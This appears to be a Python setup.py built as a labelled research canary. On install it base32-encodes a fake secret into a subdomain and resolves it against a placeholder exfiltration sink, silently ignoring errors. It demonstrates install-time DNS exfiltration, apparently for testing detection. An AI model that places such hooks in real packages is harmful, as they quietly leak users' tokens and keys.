"""
SAFETY RESEARCH PACKAGE — NOT REAL MALWARE.
Technique: DNS exfiltration — secret encoded into subdomain label.
Real malware encodes stolen data (tokens, keys) into a subdomain of an
attacker-controlled domain; DNS servers log the label, leaking the data.
Sink: *.exfil.canary-test.example.com (fake).
"""
import base64
import socket
from setuptools import setup

# Encode a fake secret into a base32 subdomain label and resolve it.
# The fakeinternet appliance logs the full query, capturing the "exfiltrated" data.
try:
    _secret = b"FAKESECRET-CORPUS-1234"
    _label  = base64.b32encode(_secret).decode().lower().rstrip("=")
    socket.gethostbyname(f"{_label}.exfil.canary-test.example.com")
except Exception:
    pass

setup(
    name="canary-dns-exfil",
    version="1.0.0",
    description="[CORPUS] DNS exfiltration on install — safety research package",
    packages=["canary_dns_exfil"],
)
